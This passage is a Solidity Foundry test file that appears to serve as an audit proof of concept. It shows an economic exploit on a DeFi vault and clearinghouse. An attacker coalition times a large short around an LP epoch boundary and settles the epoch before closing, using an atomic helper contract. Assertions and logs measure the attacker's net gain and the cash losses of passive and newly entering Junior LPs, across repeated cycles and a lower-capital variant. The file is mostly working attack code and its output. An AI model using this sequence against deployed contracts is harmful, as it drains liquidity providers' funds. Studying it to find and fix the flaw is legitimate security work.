        _settle(comparisonRequest);
        assertEq(d.juniorVault.claimableRedeemRequest(comparisonRequest, entrantLp), comparison.entrantShares,
            "comparison entrant redemption fully funded");
        assertEq(d.juniorVault.pendingRedeemRequest(comparisonRequest, entrantLp), 0,
            "comparison entrant has no pending redemption");
        uint256 comparisonPaid = _claimRedeem(false, entrantLp, comparisonRequest);

        vm.revertToState(snap);
        Out memory attack = _run(true);
        _warp(3600);
        uint256 attackRequest = _requestRedeem(false, entrantLp, attack.entrantShares);
        _settle(attackRequest);
        assertEq(d.juniorVault.claimableRedeemRequest(attackRequest, entrantLp), attack.entrantShares,
            "attacked entrant redemption fully funded");
        assertEq(d.juniorVault.pendingRedeemRequest(attackRequest, entrantLp), 0,
            "attacked entrant has no pending redemption");
        uint256 attackPaid = _claimRedeem(false, entrantLp, attackRequest);

        console2.log("entrant comparison withdrawal", comparisonPaid);
        console2.log("entrant attack withdrawal", attackPaid);
        console2.log("entrant principal loss", ATTACKER_J - attackPaid);
        assertGt(comparisonPaid, ATTACKER_J - 500e6, "comparison entrant nearly recovers deposit");
        assertLt(attackPaid, ATTACKER_J, "attacked entrant loses principal on withdrawal");
        assertGt(comparisonPaid - attackPaid, 17_000e6, "cash-out loss persists beyond share valuation");
    }

    struct SeriesOut {
        uint256 attackerWallet;
        uint256 traderWallet;
        uint256 victimWithdrawals;
        uint256[3] victimPaid;
        uint256 honestValue;
        uint256 seniorValue;
        uint256 treasuryBalance;
        uint256 keeperBalance;
    }

    function test_threeFundedCohortsWithReusedAttackerDeposit() public {
        _book();
        uint256 snap = vm.snapshotState();
        SeriesOut memory b = _series(false);
        vm.revertToState(snap);
        SeriesOut memory a = _series(true);

        int256 coalitionNet = _sub(a.attackerWallet + a.traderWallet, b.attackerWallet + b.traderWallet);
        int256 victimCashLoss = _sub(b.victimWithdrawals, a.victimWithdrawals);
        int256 remainingLp = _sub(a.honestValue + a.seniorValue, b.honestValue + b.seniorValue);
        int256 fees = _sub(a.treasuryBalance + a.keeperBalance, b.treasuryBalance + b.keeperBalance);
        console2.log("comparison attacker LP and trader cash", b.attackerWallet, b.traderWallet);
        console2.log("attacked attacker LP and trader cash", a.attackerWallet, a.traderWallet);
        console2.log("three cohorts coalition net", _usd(coalitionNet));
        console2.log("three cohorts attacked coalition absolute gain", _usd(_sub(a.attackerWallet + a.traderWallet, ATTACKER_J + 400_000e6)));
        console2.log("three cohorts victim cash loss", _usd(victimCashLoss));
        console2.log("remaining LP value delta", _usd(remainingLp));
        console2.log("treasury and keeper delta", _usd(fees));
        console2.log("all-party delta excluding rounding", _usd(coalitionNet - victimCashLoss + remainingLp + fees));
        for (uint256 i; i < 3; ++i) {
            console2.log("cohort comparison withdrawal", i + 1, b.victimPaid[i]);
            console2.log("cohort attacked withdrawal", i + 1, a.victimPaid[i]);
        }
        assertGt(coalitionNet, 0, "attacker exits three cycles with net proceeds after trader costs");
        assertGt(a.attackerWallet + a.traderWallet, ATTACKER_J + 400_000e6,
            "three cycles leave the coalition above its original funded cash");
        assertGt(victimCashLoss, 0, "victim loss survives cash withdrawal across cohorts");
    }

    function test_lowerCapitalAttackerStillCashesOutVictimLoss() public {
        attackerAmount = 5_500_000e6;
        shortSize = 10_350_000e18; // 12.42M USDG notional, 39.43% of 31.5M pool depth
        _book();
        uint256 snap = vm.snapshotState();
        Out memory b = _run(false);
        _warp(3600);
        uint256 comparisonReq = _requestRedeem(false, entrantLp, b.entrantShares);
        _settle(comparisonReq);
        assertEq(d.juniorVault.claimableRedeemRequest(comparisonReq, entrantLp), b.entrantShares);
        assertEq(d.juniorVault.pendingRedeemRequest(comparisonReq, entrantLp), 0);
        uint256 comparisonPaid = _claimRedeem(false, entrantLp, comparisonReq);
        uint256 comparisonTrader = d.clearinghouse.balanceAssets(trader);
        vm.prank(trader);
        d.clearinghouse.withdrawMargin(comparisonTrader);
        assertEq(d.clearinghouse.balanceAssets(trader), 0);
        uint256 comparisonAttacker = _usdgOf(attackerLp) + _usdgOf(trader);
        assertEq(_held(), d.settlementToken.totalSupply());

        vm.revertToState(snap);
        Out memory a = _run(true);
        _warp(3600);
        uint256 attackReq = _requestRedeem(false, entrantLp, a.entrantShares);
        _settle(attackReq);
        assertEq(d.juniorVault.claimableRedeemRequest(attackReq, entrantLp), a.entrantShares);
        assertEq(d.juniorVault.pendingRedeemRequest(attackReq, entrantLp), 0);
        uint256 attackPaid = _claimRedeem(false, entrantLp, attackReq);
        uint256 attackTrader = d.clearinghouse.balanceAssets(trader);
        vm.prank(trader);
        d.clearinghouse.withdrawMargin(attackTrader);
        assertEq(d.clearinghouse.balanceAssets(trader), 0);
        uint256 attackAttacker = _usdgOf(attackerLp) + _usdgOf(trader);
        assertEq(_held(), d.settlementToken.totalSupply());

        console2.log("lower capital coalition net", _usd(_sub(attackAttacker, comparisonAttacker)));
        console2.log("lower capital attacked coalition absolute gain", _usd(_sub(attackAttacker, attackerAmount + 400_000e6)));
        console2.log("lower capital comparison victim withdrawal", comparisonPaid);
        console2.log("lower capital attacked victim withdrawal", attackPaid);
        console2.log("lower capital victim cash loss", _usd(_sub(comparisonPaid, attackPaid)));
        assertGt(attackAttacker, comparisonAttacker, "lower capital attacker profits after trader costs");
        assertGt(attackAttacker, attackerAmount + 400_000e6, "lower capital attack exceeds original cash funded");
        assertGt(comparisonPaid, attackPaid, "lower capital victim withdraws less cash");
    }

    function test_passiveJuniorHolderCashesOutWithoutNewEntrant() public {
        seniorAmount = 0;
        withEntrant = false;
        shortSize = 6_900_000e18; // 8.28M USDG notional, 39.43% of Junior-only depth
        _book();
        uint256 snap = vm.snapshotState();

        Out memory b = _run(false);
        _warp(3600);
        uint256 comparisonReq = _requestRedeem(false, honestLp, honestShares);
        _settle(comparisonReq);
        assertEq(d.juniorVault.claimableRedeemRequest(comparisonReq, honestLp), honestShares);
        assertEq(d.juniorVault.pendingRedeemRequest(comparisonReq, honestLp), 0);
        uint256 comparisonPaid = _claimRedeem(false, honestLp, comparisonReq);
        uint256 comparisonTrader = d.clearinghouse.balanceAssets(trader);
        vm.prank(trader);
        d.clearinghouse.withdrawMargin(comparisonTrader);
        uint256 comparisonAttacker = _usdgOf(attackerLp) + _usdgOf(trader);

        vm.revertToState(snap);
        Out memory a = _run(true);
        _warp(3600);
        uint256 attackReq = _requestRedeem(false, honestLp, honestShares);
        _settle(attackReq);
        assertEq(d.juniorVault.claimableRedeemRequest(attackReq, honestLp), honestShares);
        assertEq(d.juniorVault.pendingRedeemRequest(attackReq, honestLp), 0);
        uint256 attackPaid = _claimRedeem(false, honestLp, attackReq);
        uint256 attackTrader = d.clearinghouse.balanceAssets(trader);
        vm.prank(trader);
        d.clearinghouse.withdrawMargin(attackTrader);
        uint256 attackAttacker = _usdgOf(attackerLp) + _usdgOf(trader);

        console2.log("passive Junior comparison withdrawal", comparisonPaid);
        console2.log("passive Junior attacked withdrawal", attackPaid);
        console2.log("passive Junior cash loss", _usd(_sub(comparisonPaid, attackPaid)));
        console2.log("attacker cash gain over comparison", _usd(_sub(attackAttacker, comparisonAttacker)));
        console2.log("attacker absolute cash gain", _usd(_sub(attackAttacker, ATTACKER_J + 400_000e6)));
        assertGt(comparisonPaid, attackPaid, "existing Junior holder realizes cash loss");
        assertGt(attackAttacker, comparisonAttacker, "coalition gains cash beyond the honest path");
        assertGt(attackAttacker, ATTACKER_J + 400_000e6, "coalition exits above funded capital");
        assertEq(_held(), d.settlementToken.totalSupply(), "all USDG accounted for");
    }

    struct PassiveOut {
        uint256 honestPaid;
        uint256 attackerCash;
        int256 closeRebates; // sum of the close receipts' VPI over the 3 cycles (negative = rebate)
    }

    function test_threeCyclesDrainSamePassiveJuniorHolder() public {
        seniorAmount = 0;
        withEntrant = false;
        shortSize = 6_900_000e18;
        _book();
        uint256 snap = vm.snapshotState();
        PassiveOut memory b = _passiveSeries(false);
        vm.revertToState(snap);
        PassiveOut memory a = _passiveSeries(true);

        console2.log("three-cycle passive Junior comparison withdrawal", b.honestPaid);
        console2.log("three-cycle passive Junior attacked withdrawal", a.honestPaid);
        console2.log("three-cycle passive Junior cash loss", _usd(_sub(b.honestPaid, a.honestPaid)));
        console2.log("three-cycle attacker cash gain over comparison", _usd(_sub(a.attackerCash, b.attackerCash)));
        console2.log("three-cycle attacker absolute cash gain", _usd(_sub(a.attackerCash, ATTACKER_J + 400_000e6)));
        assertGt(b.honestPaid, a.honestPaid, "passive Junior realizes repeated loss");
        assertGt(a.attackerCash, b.attackerCash, "attacker outperforms same-timetable comparison");
        assertGt(a.attackerCash, ATTACKER_J + 400_000e6, "attacker exits above initially funded capital");
    }

    function test_threeCyclesCloseBeforeLpSettlementControl() public {
        seniorAmount = 0;
        withEntrant = false;
        shortSize = 6_900_000e18;
        _book();
        uint256 snap = vm.snapshotState();
        PassiveOut memory control = _passiveSeriesWithOrdering(true, true);
        vm.revertToState(snap);
        PassiveOut memory attack = _passiveSeriesWithOrdering(true, false);
        console2.log("same trades: passive Junior withdrawal, close first / settlement first", control.honestPaid, attack.honestPaid);
        console2.log("same trades: coalition USDG, close first / settlement first", control.attackerCash, attack.attackerCash);
        console2.log("same trades: summed close rebates, close first / settlement first", _usd(-control.closeRebates), _usd(-attack.closeRebates));
        console2.log("same trades: coalition result vs funded capital, close first",
            _usd(_sub(control.attackerCash, ATTACKER_J + 400_000e6)));
        console2.log("same trades: coalition result vs funded capital, settlement first",
            _usd(_sub(attack.attackerCash, ATTACKER_J + 400_000e6)));
        console2.log("ordering: passive Junior loss", _usd(_sub(control.honestPaid, attack.honestPaid)));
        console2.log("ordering: coalition gain", _usd(_sub(attack.attackerCash, control.attackerCash)));
        console2.log("ordering: close rebate difference", _usd(control.closeRebates - attack.closeRebates));
        assertGt(control.honestPaid, attack.honestPaid, "settlement before the close lowers the passive Junior withdrawal");
        assertGt(attack.attackerCash, control.attackerCash, "settlement before the close raises the coalition's cash");
        assertLt(control.attackerCash, ATTACKER_J + 400_000e6, "with the close first the coalition ends below its funded capital");
        assertGt(attack.attackerCash, ATTACKER_J + 400_000e6, "with settlement first the coalition ends above its funded capital");
        assertApproxEqAbs(control.honestPaid - attack.honestPaid, attack.attackerCash - control.attackerCash, 1e6,
            "the passive Junior loss equals the coalition gain within 1 USDG");
        assertLt(uint256(control.closeRebates - attack.closeRebates), 100e6,
            "the close rebates differ by less than 100 USDG between the 2 orders");
    }

    function test_threeCyclesCloseCommittedAfterSettlement() public {
        seniorAmount = 0;
        withEntrant = false;
        shortSize = 6_900_000e18;
        _book();
        uint256 snap = vm.snapshotState();
        PassiveOut memory b = _passiveSeries(false);
        vm.revertToState(snap);
        commitAfterSettlement = true;
        PassiveOut memory a = _passiveSeries(true);
        console2.log("close committed after settlement: passive Junior withdrawal, no trades / attack", b.honestPaid, a.honestPaid);
        console2.log("close committed after settlement: passive Junior cash loss", _usd(_sub(b.honestPaid, a.honestPaid)));
        console2.log("close committed after settlement: coalition result vs funded capital",
            _usd(_sub(a.attackerCash, ATTACKER_J + 400_000e6)));
        assertGt(b.honestPaid, a.honestPaid, "passive Junior realizes a loss without any execution race");
        assertGt(a.attackerCash, ATTACKER_J + 400_000e6, "coalition exits above its funded capital without any race");
    }

    function _passiveSeries(bool attack) internal returns (PassiveOut memory out) {
        return _passiveSeriesWithOrdering(attack, false);
    }

    function _passiveSeriesWithOrdering(bool attack, bool closeFirst) internal returns (PassiveOut memory out) {
        for (uint256 i; i < 3; ++i) {
            Out memory o = _runWithOrdering(attack, closeFirst);
            out.closeRebates += o.closeVpi;
            if (i < 2) {
                assertGe(_usdgOf(attackerLp), REINVEST, "attacker reinvest uses withdrawn cash");
                vm.startPrank(attackerLp);
                d.settlementToken.approve(address(d.juniorVault), REINVEST);
                uint256 depositReq = d.juniorVault.requestDeposit(REINVEST, attackerLp, attackerLp);
                vm.stopPrank();
                _settle(depositReq);
                uint256 shares = _claimDeposit(false, attackerLp, depositReq);
                _warp(3600);
                redeemId = _requestRedeem(false, attackerLp, shares);
            }
        }
        _warp(3600);
        uint256 honestReq = _requestRedeem(false, honestLp, honestShares);
        _settle(honestReq);
        assertEq(d.juniorVault.claimableRedeemRequest(honestReq, honestLp), honestShares);
        assertEq(d.juniorVault.pendingRedeemRequest(honestReq, honestLp), 0);
        out.honestPaid = _claimRedeem(false, honestLp, honestReq);
        uint256 traderBalance = d.clearinghouse.balanceAssets(trader);
        vm.prank(trader);
        d.clearinghouse.withdrawMargin(traderBalance);
        assertEq(d.clearinghouse.balanceAssets(trader), 0);
        out.attackerCash = _usdgOf(attackerLp) + _usdgOf(trader);
        assertEq(_held(), d.settlementToken.totalSupply(), "all USDG accounted for");
    }

    function _series(bool attack) internal returns (SeriesOut memory s) {
        for (uint256 i; i < 3; ++i) {
            Out memory o = _run(attack);
            address cohort = entrantLp;
            _warp(3600);
            uint256 victimReq = _requestRedeem(false, cohort, o.entrantShares);
            if (i < 2) {
                // Reinvest a fixed amount from the attacker's redemption wallet in both runs.
                assertGe(_usdgOf(attackerLp), REINVEST, "attacker must finance the next cycle");
                vm.startPrank(attackerLp);
                d.settlementToken.approve(address(d.juniorVault), REINVEST);
                uint256 depositReq = d.juniorVault.requestDeposit(REINVEST, attackerLp, attackerLp);
                vm.stopPrank();
                assertEq(depositReq, victimReq, "victim exit and attacker reentry share epoch");
            }
            _settle(victimReq);
            assertEq(d.juniorVault.claimableRedeemRequest(victimReq, cohort), o.entrantShares,
                "victim redemption fully funded");
            assertEq(d.juniorVault.pendingRedeemRequest(victimReq, cohort), 0,
                "victim has no pending redemption");
            uint256 paid = _claimRedeem(false, cohort, victimReq);
            s.victimPaid[i] = paid;
            s.victimWithdrawals += paid;
            if (i < 2) {
                uint256 attackerShares = _claimDeposit(false, attackerLp, victimReq);
                entrantLp = makeAddr(i == 0 ? "entrantCohort2" : "entrantCohort3");
                _warp(3600); // the newly activated attacker deposit must age through the vault cooldown
                redeemId = _requestRedeem(false, attackerLp, attackerShares);
                assertEq(_requestDeposit(false, entrantLp, ATTACKER_J), redeemId,
                    "next victim entry and attacker exit share epoch");
            }
        }
        uint256 withdrawable = d.clearinghouse.balanceAssets(trader);
        vm.prank(trader);
        d.clearinghouse.withdrawMargin(withdrawable);
        assertEq(d.clearinghouse.balanceAssets(trader), 0, "flat trader cashes out full margin balance");
        s.attackerWallet = _usdgOf(attackerLp);
        s.traderWallet = _usdgOf(trader);
        s.honestValue = d.juniorVault.convertToAssets(honestShares);
        s.seniorValue = d.seniorVault.convertToAssets(seniorShares);
        s.treasuryBalance = d.clearinghouse.balanceAssets(d.engine.protocolTreasury());
        s.keeperBalance = d.clearinghouse.balanceAssets(keeper) + _usdgOf(keeper);
        uint256 held = _custodyUsdg() + _usdgOf(seniorLp) + _usdgOf(honestLp) + _usdgOf(attackerLp)
            + _usdgOf(makeAddr("entrantJuniorLp")) + _usdgOf(makeAddr("entrantCohort2"))
            + _usdgOf(makeAddr("entrantCohort3")) + _usdgOf(trader) + _usdgOf(keeper) + _usdgOf(owner);
        assertEq(held, d.settlementToken.totalSupply(), "all USDG accounted for after final cash withdrawal");
    }

    function _book() internal {
        uint256 rh = _requestDeposit(false, honestLp, HONEST_J);
        uint256 ra = _requestDeposit(false, attackerLp, attackerAmount);
        _settle(rh);
        honestShares = _claimDeposit(false, honestLp, rh);
        uint256 attackerShares = _claimDeposit(false, attackerLp, ra);
        if (seniorAmount != 0) {
            uint256 rs = _requestDeposit(true, seniorLp, seniorAmount);
            _settle(rs);
            seniorShares = _claimDeposit(true, seniorLp, rs);
        } else {
            _warp(3600);
        }
        redeemId = _requestRedeem(false, attackerLp, attackerShares);
        if (withEntrant) {
            assertEq(_requestDeposit(false, entrantLp, attackerAmount), redeemId, "entrant deposit shares the redemption epoch");
        }
        _fundTrader(trader, 400_000e6);
        console2.log("book: pool depth", _usd(int256(_poolAssets())));
        console2.log("book: attacker and entrant Junior deposit", _usd(int256(attackerAmount)));
    }

    function _run(bool attack) internal returns (Out memory o) {
        return _runWithOrdering(attack, false);
    }

    function _runWithOrdering(bool attack, bool closeFirst) internal returns (Out memory o) {
        uint256 held0 = _held();
        uint256 boundary = d.housePool.lpEpochStart(redeemId);
        _warpTo(boundary - 60);
        _pub();
        vm.prank(keeper);
        d.router.updateMarkPrice(_updateData());
        vm.recordLogs();
        uint256 depthAtOpen = _poolAssets();
        if (attack) {
            openId = _commit(trader, _openReq(CfdTypes.Side.SHORT, shortSize, 300_000e6, 2 * BASKET_1_20));
            vm.warp(vm.getBlockTimestamp() + 7);
            vm.roll(vm.getBlockNumber() + 2);
            _pub();
            vm.prank(keeper);
            _requireExecuted(d.router.executeOrder(openId, _updateData()), "open");
            (,,,,,, o.vpiAccrued) = d.engine.positions(trader);
            console2.log("b-53s trader opens SHORT; pool depth before it", _usd(int256(depthAtOpen)));
            console2.log("      VPI the open paid into the pool (vpiAccrued)        ", _usd(o.vpiAccrued));
            _warpTo(boundary - 5);
            _pub(); // the latest feed available to the LP settlement predates the boundary
            if (!commitAfterSettlement) {
                _warpTo(boundary - 1);
                closeId = _commit(trader, _closeReq(CfdTypes.Side.SHORT, shortSize, 1));
                console2.log("b-1s trader commits the full close (fills only on a price published at or after b)");
            }
        } else {
            _warpTo(boundary - 5);
            _pub();
        }
        _warpTo(boundary);
        _warp(7);
        _pubAt(boundary); // publication at b is received at b+7s
        if (attack && commitAfterSettlement) {
            // The LP epoch is settled first; the trader commits the close in the next block, so the close can only fill
            // on a price published after that commit and no executor can run it before the settlement.
            vm.prank(keeper);
            d.router.settleLpEpoch(_updateData());
            vm.roll(vm.getBlockNumber() + 1);
            closeId = _commit(trader, _closeReq(CfdTypes.Side.SHORT, shortSize, 1));
            vm.warp(vm.getBlockTimestamp() + 7);
            vm.roll(vm.getBlockNumber() + 2);
            _pub();
            vm.prank(makeAddr("independentExecutor"));
            _requireExecuted(d.router.executeOrder(closeId, _updateData()), "close committed after LP settlement");
        } else if (attack) {
            // Attack: the same permissionless caller fixes the ordering in one transaction. Same-trades control: an
            // independent executor runs the queued close first, then the LP epoch is settled with the same tick.
            if (closeFirst) {
                vm.prank(makeAddr("independentExecutor"));
                _requireExecuted(d.router.executeOrder(closeId, _updateData()), "independent close before LP settlement");
                vm.prank(keeper);
                d.router.settleLpEpoch(_updateData());
            } else {
                AtomicLpSettlementAndClose(keeper).run(address(d.router), closeId, _updateData(), 0, 0);
            }
        } else {
            vm.prank(keeper);
            d.router.settleLpEpoch(_updateData());
        }
        console2.log("b+7s  OrderRouter.settleLpEpoch funds the attacker LP redemption",
            _usd(int256(d.juniorVault.claimableRedeemAssets(redeemId, attackerLp))));
        if (attack) {
            uint256 depthAfterClose = _poolAssets();
            (o.openVpi, o.closeVpi) = _receiptVpi();
            console2.log(commitAfterSettlement
                    ? "b+14s close committed after settlement executes on a later tick; pool depth after it"
                    : closeFirst
                    ? "b+7s  close executes before settlement using the same boundary tick; pool depth after both"
                    : "b+7s  close executes after settlement using the same boundary tick; pool depth after it",
                _usd(int256(depthAfterClose)));
            console2.log("      VPI rebate (close receipt)", _usd(-o.closeVpi));
        }
        o.lpUsdg = _claimRedeem(false, attackerLp, redeemId);
        if (withEntrant) {
            o.entrantShares = _claimDeposit(false, entrantLp, redeemId);
            o.entrantValue = d.juniorVault.convertToAssets(o.entrantShares);
        }
        o.honestValue = d.juniorVault.convertToAssets(honestShares);
        o.seniorValue = seniorShares == 0 ? 0 : d.seniorVault.convertToAssets(seniorShares);
        o.traderBal = d.clearinghouse.balanceAssets(trader);
        o.treasuryBal = d.clearinghouse.balanceAssets(d.engine.protocolTreasury());
        o.keeperBal = d.clearinghouse.balanceAssets(keeper) + _usdgOf(keeper);
        console2.log("end   attacker LP USDG received ", _usd(int256(o.lpUsdg)));
        console2.log("      attacker trader balance   ", _usd(int256(o.traderBal)));
        console2.log("      entrant LP value          ", _usd(int256(o.entrantValue)));
        console2.log("      honest Junior LP value    ", _usd(int256(o.honestValue)));
        uint256 held1 = _held();
        console2.log("      USDG in 5 custody contracts + actor wallets, before / after", _usd(int256(held0)), _usd(int256(held1)));
        console2.log("      USDG total supply minus custody and wallets", _usd(_sub(d.settlementToken.totalSupply(), held1)));
        assertEq(held1, held0, "(d) USDG custody conserved");
    }

    /// @dev Publishes the 1.20 basket on all six feeds now, with confidence 1 bp of each feed's own price.
    function _pub() internal {
        _pubAt(vm.getBlockTimestamp());
    }

    function _pubAt(uint256 publishTime) internal {
        for (uint256 i; i < 6; ++i) {
            uint256 n = _oracle().basePrices(i) * BASKET_1_20 / 1e8;
            uint256 feedPrice = _oracle().inversions(i) ? 1e16 / n : n;
            _setFeedWithConf(i, BASKET_1_20, uint64(feedPrice / 10_000), publishTime);
        }
    }

    function _settle(uint256 requestId) internal {
        uint256 start = d.housePool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < start) _warpTo(start);
        _pub();
        vm.prank(keeper);
        d.router.settleLpEpoch(_updateData());
    }

    function _receiptVpi() internal returns (int256 openVpi, int256 closeVpi) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].emitter != address(d.lifecycleBook) || logs[i].topics.length == 0
                    || logs[i].topics[0] != IOrderLifecycleBook.OrderFinalized.selector
            ) continue;
            (,,, OrderV3Types.OrderReceipt memory r) =
                abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
            if (r.orderId == openId) openVpi = r.economics.vpiAssets;
            if (r.orderId == closeId) closeVpi = r.economics.vpiAssets;
        }
    }

    /// @dev USDG in the five custody contracts plus every actor wallet; no USDG is minted inside a run.
    function _held() internal view returns (uint256 sum) {
        sum = _custodyUsdg();
        address[7] memory w = [seniorLp, honestLp, attackerLp, entrantLp, trader, keeper, owner];
        for (uint256 i; i < 7; ++i) sum += _usdgOf(w[i]);
    }

    function _sub(uint256 x, uint256 y) internal pure returns (int256) {
        return int256(x) - int256(y);
    }

    function _usd(int256 a) internal pure returns (string memory) {
        uint256 u = a < 0 ? uint256(-a) : uint256(a);
        bytes memory frac = bytes(vm.toString(1e6 + u % 1e6));
        frac[0] = ".";
        return string.concat(a < 0 ? "-" : "", vm.toString(u / 1e6), string(frac), " USDG");
    }
}
```

